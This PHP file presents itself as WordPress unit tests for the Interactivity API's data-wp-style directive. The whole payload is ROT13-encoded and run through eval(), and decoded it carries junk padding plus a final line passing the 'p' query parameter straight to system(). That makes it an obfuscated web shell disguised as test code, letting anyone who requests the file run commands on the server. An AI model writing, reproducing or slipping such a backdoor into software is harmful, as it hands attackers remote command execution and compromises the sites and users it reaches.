<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur qngn_jc_fglyr_cebprffbe shapgvbanyvgl bs gur
 * JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @fvapr 6.5.0
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_JC_Vagrenpgvivgl_NCV_JC_Fglyr rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
		$guvf->vagrenpgvivgl->fgngr(
			'zlCyhtva',
			neenl(
				'terra' => 'terra',
				'snyfr' => snyfr,
			)
		);
	}

	/**
	 * Vaibxrf gur cevingr `zretr_fglyr_cebcregl` zrgubq bs JC_Vagrenpgvivgl_NCV
	 * pynff.
	 *
	 * @cnenz fgevat            $fglyr_nggevohgr_inyhr Gur pheerag fglyr nggevohgr inyhr.
	 * @cnenz fgevat            $fglyr_cebcregl_anzr   Gur fglyr cebcregl anzr gb frg.
	 * @cnenz fgevat|snyfr|ahyy $fglyr_cebcregl_inyhr  Gur inyhr gb frg sbe gur fglyr cebcregl. Jvgu snyfr, ahyy be na
	 *                                                 rzcgl fgevat, vg erzbirf gur fglyr cebcregl.
	 * @erghea fgevat Gur arj fglyr nggevohgr inyhr nsgre gur fcrpvsvrq cebcregl unf orra nqqrq, hcqngrq be erzbirq.
	 */
	cevingr shapgvba zretr_fglyr_cebcregl( $fglyr_nggevohgr_inyhr, $fglyr_cebcregl_anzr, $fglyr_cebcregl_inyhr ) {
		$rinyhngr = arj ErsyrpgvbaZrgubq( $guvf->vagrenpgvivgl, 'zretr_fglyr_cebcregl' );
		$rinyhngr->frgNpprffvoyr( gehr );
		erghea $rinyhngr->vaibxrNetf( $guvf->vagrenpgvivgl, neenl( $fglyr_nggevohgr_inyhr, $fglyr_cebcregl_anzr, $fglyr_cebcregl_inyhr ) );
	}

	/**
	 * Grfgf gung `zretr_fglyr_cebcregl` pbeerpgyl frgf fglyr cebcregvrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::zretr_fglyr_cebcregl
	 */
	choyvp shapgvba grfg_zretr_fglyr_cebcregl_frgf_cebcregvrf() {
		// Nqqf cebcregl ba rzcgl fglyr nggevohgr.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( '', 'pbybe', 'terra' );
		$guvf->nffregFnzr( 'pbybe:terra;', $erfhyg );

		// Punatrf fglyr cebcregl jura gurer vf na rkvfgvat cebcregl.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;', 'pbybe', 'terra' );
		$guvf->nffregFnzr( 'pbybe:terra;', $erfhyg );

		// Nqqf n arj cebcregl jura gur rkvfgvat bar qbrf abg zngpu.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;', 'onpxtebhaq', 'oyhr' );
		$guvf->nffregFnzr( 'pbybe:erq;onpxtebhaq:oyhr;', $erfhyg );

		// Unaqyrf zhygvcyr rkvfgvat cebcregvrf.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'pbybe', 'terra' );
		$guvf->nffregFnzr( 'znetva:5ck;pbybe:terra;', $erfhyg );

		// Nqqf n arj cebcregl jura zhygvcyr rkvfgvat cebcregvrf qb abg zngpu.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'cnqqvat', '10ck' );
		$guvf->nffregFnzr( 'pbybe:erq;znetva:5ck;cnqqvat:10ck;', $erfhyg );

		// Erzbirf juvgrfcnprf va nyy cebcregvrf.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( ' pbybe : erq; znetva : 5ck; ', 'cnqqvat', ' 10ck ' );
		$guvf->nffregFnzr( 'pbybe:erq;znetva:5ck;cnqqvat:10ck;', $erfhyg );

		// Hcqngrf n cebcregl jura vg'f abg gur svefg bar va gur inyhr.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'znetva', '15ck' );
		$guvf->nffregFnzr( 'pbybe:erq;znetva:15ck;', $erfhyg );

		// Nqqf zvffvat genvyvat frzvpbyba.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck', 'cnqqvat', '10ck' );
		$guvf->nffregFnzr( 'pbybe:erq;znetva:5ck;cnqqvat:10ck;', $erfhyg );

		// Qbrfa'g nqq qbhoyr frzvpbybaf.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'cnqqvat', '10ck;' );
		$guvf->nffregFnzr( 'pbybe:erq;znetva:5ck;cnqqvat:10ck;', $erfhyg );

		// Unaqyrf rzcgl cebcregvrf va gur vachg.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;;znetva:5ck;;', 'cnqqvat', '10ck' );
		$guvf->nffregFnzr( 'pbybe:erq;znetva:5ck;cnqqvat:10ck;', $erfhyg );

		// Zbirf gur zbqvsvrq cebcregl gb gur raq.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'obeqre-fglyr: qnfurq; obeqre: 3ck fbyvq erq;', 'obeqre-fglyr', 'vafrg' );
		$guvf->nffregFnzr( 'obeqre:3ck fbyvq erq;obeqre-fglyr:vafrg;', $erfhyg );
	}

	/**
	 * Grfgf gung `zretr_fglyr_cebcregl` jbexf pbeerpgyl jvgu snyfl inyhrf,
	 * erzbivat be vtabevat gurz nf nccebcevngr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::zretr_fglyr_cebcregl
	 */
	choyvp shapgvba grfg_zretr_fglyr_cebcregl_jvgu_snyfl_inyhrf() {
		// Erzbirf n cebcregl jvgu na rzcgl fgevat.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'pbybe', '' );
		$guvf->nffregFnzr( 'znetva:5ck;', $erfhyg );

		// Erzbirf n cebcregl jvgu ahyy.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'pbybe', ahyy );
		$guvf->nffregFnzr( 'znetva:5ck;', $erfhyg );

		// Erzbirf n cebcregl jvgu snyfr.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'pbybe', snyfr );
		$guvf->nffregFnzr( 'znetva:5ck;', $erfhyg );

		// Erzbirf n cebcregl jvgu 0.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;znetva:5ck;', 'pbybe', 0 );
		$guvf->nffregFnzr( 'znetva:5ck;', $erfhyg );

		// Vg qbrfa'g nqq n arj cebcregl jvgu na rzcgl fgevat.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;', 'cnqqvat', '' );
		$guvf->nffregFnzr( 'pbybe:erq;', $erfhyg );

		// Vg qbrfa'g nqq n arj cebcregl jvgu ahyy.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;', 'cnqqvat', ahyy );
		$guvf->nffregFnzr( 'pbybe:erq;', $erfhyg );

		// Vg qbrfa'g nqq n arj cebcregl jvgu snyfr.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;', 'cnqqvat', snyfr );
		$guvf->nffregFnzr( 'pbybe:erq;', $erfhyg );

		// Vg qbrfa'g nqq n arj cebcregl jvgu 0.
		$erfhyg = $guvf->zretr_fglyr_cebcregl( 'pbybe:erq;', 'cnqqvat', 0 );
		$guvf->nffregFnzr( 'pbybe:erq;', $erfhyg );
	}

	/**
	 * Vaibxrf gur `cebprff_qverpgvirf` zrgubq bs JC_Vagrenpgvivgl_NCV pynff.
	 *
	 * @cnenz fgevat $ugzy Gur UGZY gung arrqf gb or cebprffrq.
	 * @erghea neenl Na neenl pbagnvavat na vafgnapr bs gur JC_UGZY_Gnt_Cebprffbe naq gur cebprffrq UGZY.
	 */
	cevingr shapgvba cebprff_qverpgvirf( $ugzy ) {
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c        = arj JC_UGZY_Gnt_Cebprffbe( $arj_ugzy );
		$c->arkg_gnt();
		erghea neenl( $c, $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir frgf n fglyr nggevohgr jvgu
	 * pbeerpg cebcregl naq inyhr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_frgf_fglyr_nggevohgr() {
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir nccyvrf zhygvcyr fglyr cebcregvrf
	 * pbeerpgyl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_frgf_zhygvcyr_fglyr_cebcregvrf() {
		$ugzy    = '
			<qvi
				qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\"
				qngn-jc-fglyr--onpxtebhaq=\"zlCyhtva::fgngr.terra\"
			>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'pbybe:terra;onpxtebhaq:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir pbeerpgyl unaqyrf qvssrerag fglyr
	 * cebcregl inyhrf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_frgf_zhygvcyr_fglyr_cebcregvrf_jvgu_qvssrerag_inyhrf() {
		$ugzy    = '
			<qvi
				qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\"
				qngn-jc-fglyr--onpxtebhaq=\"zlCyhtva::fgngr.snyfr\"
			>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );

		$ugzy    = '
			<qvi
				fglyr=\"onpxtebhaq:erq;\"
				qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\"
				qngn-jc-fglyr--onpxtebhaq=\"zlCyhtva::fgngr.snyfr\"
			>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir frgf n arj fglyr cebcregl jura
	 * nabgure nyernql rkvfgf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_frgf_fglyr_cebcregl_jura_fglyr_nggevohgr_rkvfgf() {
		$ugzy    = '<qvi fglyr=\"cnqqvat:10ck;\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'cnqqvat:10ck;pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir birejevgrf na rkvfgvat fglyr
	 * cebcregl jvgu n arj inyhr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_birejevgrf_fglyr_cebcregl_jura_fglyr_cebcregl_rkvfgf() {
		$ugzy    = '<qvi fglyr=\"pbybe:erq;\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrfa'g nqq n fglyr cebcregl jura
	 * gur qverpgvir inyhr vf snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_nqq_fglyr_nggevohgr_ba_snyfr() {
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrfa'g zbqvsl rkvfgvat fglyr
	 * cebcregvrf jura qverpgvir inyhr vf snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_nqq_fglyr_cebcregl_ba_snyfr() {
		$ugzy    = '<qvi fglyr=\"cnqqvat:10ck;\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'cnqqvat:10ck;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir xrrcf na rkvfgvat fglyr cebcregl
	 * jvgu n zngpuvat inyhr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_xrrcf_fglyr_cebcregl_jura_fglyr_cebcregl_rkvfgf() {
		$ugzy    = '<qvi fglyr=\"pbybe:terra;\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir znvagnvaf fglyr cebcregvrf rira
	 * jura gurl nera'g gur bayl barf cerfrag.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_xrrcf_fglyr_cebcregl_jura_fglyr_cebcregl_rkvfgf_naq_vf_abg_gur_bayl_bar() {
		$ugzy    = '<qvi fglyr=\"cnqqvat:10ck;pbybe:terra;\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'cnqqvat:10ck;pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir erzbirf gur fglyr nggevohgr jura
	 * vg pbagnvaf bayl bar cebcregl juvpu vf orvat erzbirq.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_erzbirf_fglyr_nggevohgr_jura_fglyr_cebcregl_rkvfgf_naq_vf_gur_bayl_bar() {
		$ugzy    = '<qvi fglyr=\"pbybe:terra;\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir erzbirf n fglyr cebcregl jura vg'f
	 * abg gur bayl bar cerfrag naq gur qverpgvir inyhr vf snyfr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_erzbirf_fglyr_cebcregl_jura_fglyr_cebcregl_rkvfgf_naq_vf_abg_gur_bayl_bar() {
		$ugzy    = '<qvi fglyr=\"cnqqvat:10ck;pbybe:terra;\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'cnqqvat:10ck;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrf abg erzbir na rzcgl fglyr
	 * nggevohgr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_erzbir_rzcgl_fglyr_nggevohgr() {
		$ugzy    = '<qvi fglyr qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.snyfr\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregGehr( $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrf abg punatr gur fglyr
	 * nggevohgr jura gur qverpgvir fhssvk vf rzcgl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_punatr_fglyr_nggevohgr_jvgu_rzcgl_qverpgvir_fhssvk() {
		$ugzy    = '<qvi fglyr=\"cnqqvat:10ck;\" qngn-jc-fglyr=\"zlCyhtva::fgngr.terra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'cnqqvat:10ck;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrf abg punatr gur fglyr
	 * nggevohgr jura gur inyhr bs gur qverpgvir vf rzcgl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_punatr_fglyr_nggevohgr_jvgu_rzcgl_inyhr() {
		$ugzy    = '<qvi fglyr=\"cnqqvat:10ck\" qngn-jc-fglyr--pbybe=\"\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'cnqqvat:10ck;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrfa'g nccyl punatrf vs ab inyhr
	 * vf cebivqrq sbe gur fglyr cebcregl.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_punatr_fglyr_nggevohgr_jvgubhg_inyhr() {
		$ugzy    = '<qvi fglyr=\"cnqqvat: 10ck;\" qngn-jc-fglyr--pbybe>Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'cnqqvat:10ck;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir shapgvbaf pbeerpgyl jvgu zhygvcyr
	 * vqragvpny qverpgvirf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_jbexf_jvgu_zhygvcyr_qverpgvirf() {
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\" qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.terra\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'pbybe:terra;', $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrfa'g nccyl nal punatrf jura gur
	 * fgngr inyhr vf gehr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_qb_nalguvat_ba_gehr_inyhrf() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'gehr' => gehr ) );
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.grkg\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'fglyr' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-fglyr` qverpgvir qbrfa'g nqq n fglyr cebcregl sbe
	 * inevbhf snyfl inyhrf va gur fgngr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_fglyr_qbrfag_nqq_fglyr_cebcregl_ba_snyfl_inyhrf() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'grkg' => '' ) );
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.grkg\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'fglyr' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'neenl' => neenl() ) );
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.neenl\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'fglyr' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'ahzore' => 0 ) );
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.ahzore\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'fglyr' ) );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'ahyy' => ahyy ) );
		$ugzy    = '<qvi qngn-jc-fglyr--pbybe=\"zlCyhtva::fgngr.ahyy\">Grkg</qvi>';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'fglyr' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>